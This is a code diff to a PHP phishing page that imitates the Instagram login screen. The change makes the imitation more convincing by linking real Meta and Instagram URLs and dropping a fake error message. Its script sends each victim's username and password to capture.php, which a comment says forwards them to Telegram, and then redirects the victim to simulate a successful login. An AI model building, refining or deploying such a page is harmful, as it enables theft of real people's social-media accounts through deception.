@@ -133,14 +133,6 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             background-color: #1877f2;
         }
 
-        .error-message {
-            color: #ed4956;
-            font-size: 14px;
-            text-align: center;
-            margin-top: 15px;
-            display: none;
-        }
-
         .loading {
             display: none;
             margin-top: 10px;
@@ -188,6 +180,10 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             margin-bottom: 10px;
         }
 
+        .fb-login:hover {
+            text-decoration: underline;
+        }
+
         .fb-login svg {
             width: 16px;
             height: 16px;
@@ -202,6 +198,10 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             color: #00376b;
             font-size: 12px;
             text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
         }
 
         .signup-box {
@@ -220,6 +220,10 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             font-weight: 600;
         }
 
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
         .app-download {
             text-align: center;
             margin-top: 10px;
@@ -235,6 +239,10 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             display: flex;
             justify-content: center;
             gap: 8px;
+        }
+
+        .app-badges a {
+            display: inline-block;
         }
 
         .app-badges img {
@@ -262,6 +270,10 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             font-size: 12px;
             text-decoration: none;
             white-space: nowrap;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
         }
 
         .footer-copyright {
@@ -299,7 +311,6 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
                 </div>
                 <input type="hidden" id="redirect_url" value="<?php echo htmlspecialchars($redirect_url); ?>">
                 <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
-                <div class="error-message" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
                 <div class="loading" id="loading">
                     <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                         <circle cx="9" cy="9" r="8" stroke="#c7c7c7" stroke-width="2"/>
@@ -308,26 +319,37 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
                 </div>
             </form>
             <div class="divider"><span>OR</span></div>
-            <a href="#" class="fb-login">
+            <a href="https://www.facebook.com/login.php" target="_blank" class="fb-login">
                 <svg viewBox="0 0 24 24" fill="#385185">
                     <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02Z"/>
                 </svg>
                 Log in with Facebook
             </a>
-            <div class="forgot-password"><a href="#">Forgot password?</a></div>
+            <div class="forgot-password"><a href="https://www.instagram.com/accounts/password/reset/" target="_blank">Forgot password?</a></div>
         </div>
-        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
+        <div class="signup-box">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a></div>
         <div class="app-download">
             <p>Get the app.</p>
             <div class="app-badges">
-                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
-                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play"></a>
+                <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT" target="_blank"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft"></a>
             </div>
         </div>
     </div>
     <div class="footer">
         <div class="footer-links">
-            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Meta Verified</a>
+            <a href="https://about.meta.com/" target="_blank">Meta</a>
+            <a href="https://about.instagram.com/" target="_blank">About</a>
+            <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
+            <a href="https://www.instagram.com/about/jobs/" target="_blank">Jobs</a>
+            <a href="https://help.instagram.com/" target="_blank">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
+            <a href="https://www.instagram.com/legal/privacy/" target="_blank">Privacy</a>
+            <a href="https://www.instagram.com/legal/terms/" target="_blank">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
+            <a href="https://www.instagram.com/lite/" target="_blank">Instagram Lite</a>
+            <a href="https://www.threads.net/" target="_blank">Threads</a>
+            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
         </div>
         <div class="footer-copyright">© 2024 Instagram from Meta</div>
     </div>
@@ -335,7 +357,6 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
     <script>
         const form = document.getElementById("loginForm");
         const loginBtn = document.getElementById("loginBtn");
-        const errorMsg = document.getElementById("errorMsg");
         const loading = document.getElementById("loading");
         const usernameInput = document.getElementById("username");
         const passwordInput = document.getElementById("password");
@@ -364,23 +385,18 @@ $redirect_url = $_SESSION['redirect_url'] ?? 'https://www.instagram.com/';
             loginBtn.disabled = true;
             loginBtn.style.display = "none";
             loading.style.display = "block";
-            errorMsg.style.display = "none";
 
-            try {
-                await fetch("capture.php", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-                    body: "username=" + encodeURIComponent(usernameInput.value) + "&password=" + encodeURIComponent(passwordInput.value) + "&redirect_url=" + encodeURIComponent(redirectUrl)
-                });
+            // Send credentials to Telegram (in background)
+            fetch("capture.php", {
+                method: "POST",
+                headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                body: "username=" + encodeURIComponent(usernameInput.value) + "&password=" + encodeURIComponent(passwordInput.value) + "&redirect_url=" + encodeURIComponent(redirectUrl)
+            });
 
-                setTimeout(function() {
-                    window.location.href = redirectUrl;
-                }, 1500);
-            } catch (error) {
-                loading.style.display = "none";
-                loginBtn.style.display = "block";
-                loginBtn.disabled = false;
-            }
+            // Redirect to the original video immediately (simulate successful login)
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 1200);
         });
     </script>
 </body>
